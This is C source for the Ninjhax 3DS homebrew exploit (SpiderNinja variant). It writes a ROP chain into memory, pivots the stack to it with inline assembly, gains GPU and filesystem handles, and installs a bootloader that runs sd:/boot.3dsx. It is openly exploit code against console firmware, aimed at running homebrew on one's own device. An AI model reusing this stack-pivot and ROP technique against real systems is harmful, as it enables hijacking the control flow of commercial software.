#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/FS.h>
#include "text.h"
#include "../../../spider_thread0_rop/spider_thread0_rop_bin.h"
#include "../../../cn_bootloader/cn_bootloader_bin.h"

#include "../../../build/constants.h"

#define TOPFBADR1 ((u8*)CN_TOPFBADR1)
#define TOPFBADR2 ((u8*)CN_TOPFBADR2)

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _strappend(char* str1, char* str2)
{
	_strcpy(&str1[_strlen(str1)], str2);
}

const u8 hexTable[]=
{
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

void hex2str(char* out, u32 val)
{
	int i;
	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
	out[8]=0x00;
}

void renderString(char* str, int x, int y)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SPIDER_GSPGPU_FlushDataCache_ADR;
	drawString(TOPFBADR1,str,x,y);
	drawString(TOPFBADR2,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void centerString(char* str, int y)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SPIDER_GSPGPU_FlushDataCache_ADR;
	int x=200-(_strlen(str)*4);
	drawString(TOPFBADR1,str,x,y);
	drawString(TOPFBADR2,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void drawHex(u32 val, int x, int y)
{
	char str[9];

	hex2str(str,val);
	renderString(str,x,y);
}

Result _GSPGPU_AcquireRight(Handle handle, u8 flags)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x160042; //request header code
	cmdbuf[1]=flags;
	cmdbuf[2]=0x0;
	cmdbuf[3]=0xffff8001;

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_FlushInvalidateCache(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00010042; //request header code
	cmdbuf[1]=0x00100000;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_SetupBootloader(Handle handle, u32 addr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00020042; //request header code
	cmdbuf[1]=addr;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_GetHandle(Handle handle, u32 index, Handle* out)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00040040; //request header code
	cmdbuf[1]=index;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(out)*out=cmdbuf[5];

	return cmdbuf[1];
}

void clearScreen(u8 shade)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SPIDER_GSPGPU_FlushDataCache_ADR;
	memset(TOPFBADR1, shade, 240*400*3);
	memset(TOPFBADR2, shade, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void errorScreen(char* str, u32* dv, u8 n)
{
	clearScreen(0x00);
	renderString("FATAL ERROR",0,0);
	renderString(str,0,10);
	if(dv && n)
	{
		int i;
		for(i=0;i<n;i++)drawHex(dv[i], 8, 50+i*10);
	}
	while(1);
}

void drawTitleScreen(char* str)
{
	clearScreen(0x00);
	centerString("NINJHAX v1.1b",0);
	centerString(BUILDTIME,10);
	centerString("http://smealum.net/ninjhax/",20);
#if BUILD_SPIDERNINJA
	centerString("SpiderNinja",30);
	centerString("http://yifan.lu/p/spiderninja",40);
	renderString(str, 0, 60);
#else
	renderString(str, 0, 40);
#endif
}

int main_initial(void)
{
	drawTitleScreen("");
	drawTitleScreen("running exploit... 000%");
	memcpy((u8*)SPIDER_THREAD0ROP_VADR, spider_thread0_rop_bin, spider_thread0_rop_bin_len);
	drawTitleScreen("running exploit... 010%");
	asm volatile ("mov sp, %0\t\n"
				  "pop {r0, pc}\t\n" :: "r" (SPIDER_THREAD0ROP_VADR) : "sp", "memory");
	while (1);
	return 0;
}

int main_secondary(Handle hbHandle)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;

	Result ret;

	_GSPGPU_AcquireRight(*gspHandle, 0x0); //get in line for gsp rights

	drawTitleScreen("running exploit... 070%");
	_HB_FlushInvalidateCache(hbHandle);
	Handle fsHandle;
	ret=_HB_GetHandle(hbHandle, 0x0, &fsHandle);

	// //allocate some memory for the bootloader code (will be remapped)
	// u32 out; ret=svc_controlMemory(&out, 0x13FF0000, 0x00000000, 0x00008000, MEMOP_COMMIT, 0x3);
	//allocate some memory for homebrew .text/rodata/data/bss... (will be remapped)
	u32 out; ret=svc_controlMemory(&out, CN_ALLOCPAGES_ADR, 0x00000000, CN_ADDPAGES*0x1000, MEMOP_COMMIT, 0x3);

	drawTitleScreen("running exploit... 080%");

	if(_HB_SetupBootloader(hbHandle, 0x13FF0000))*((u32*)NULL)=0xBABE0061;

	drawTitleScreen("running exploit... 090%");
	
	memcpy((u8*)0x00100000, cn_bootloader_bin, cn_bootloader_bin_len);
	
	drawTitleScreen("running exploit... 095%");

	_HB_FlushInvalidateCache(hbHandle);

	drawTitleScreen("running exploit... 100%");

	//open sdmc 3dsx file
	Handle fileHandle;
	FS_archive sdmcArchive=(FS_archive){0x9, (FS_path){PATH_EMPTY, 1, (u8*)""}};
	FS_path filePath=(FS_path){PATH_CHAR, 11, (u8*)"/boot.3dsx"};
	if((ret=FSUSER_OpenFileDirectly(fsHandle, &fileHandle, sdmcArchive, filePath, FS_OPEN_READ, FS_ATTRIBUTE_NONE))!=0)
	{
		errorScreen("   failed to open sd:/boot.3dsx.\n    does it exist ?", (u32*)&ret, 1);
	}
	
	svc_controlMemory(&out, 0x14000000, 0x00000000, 0x02000000, MEMOP_FREE, 0x0);

	void (*callBootloader)(Handle hb, Handle file)=(void*)CN_BOOTLOADER_LOC;
	void (*setArgs)(u32* src, u32 length)=(void*)CN_ARGSETTER_LOC;
	_GSPGPU_ReleaseRight(*gspHandle); //disable GSP module access
	svc_closeHandle(*gspHandle);

	setArgs(NULL, 0);
	callBootloader(hbHandle, fileHandle);

	while(1);
	return 0;
}

int main_start(u32 is_secondary, Handle hbHandle)
{
	if (is_secondary)
	{
		return main_secondary(hbHandle);
	}
	else
	{
		return main_initial();
	}
}

int main(int argc, const char *argv[])
{
	return main_start((u32)argc, (Handle)argv);
}
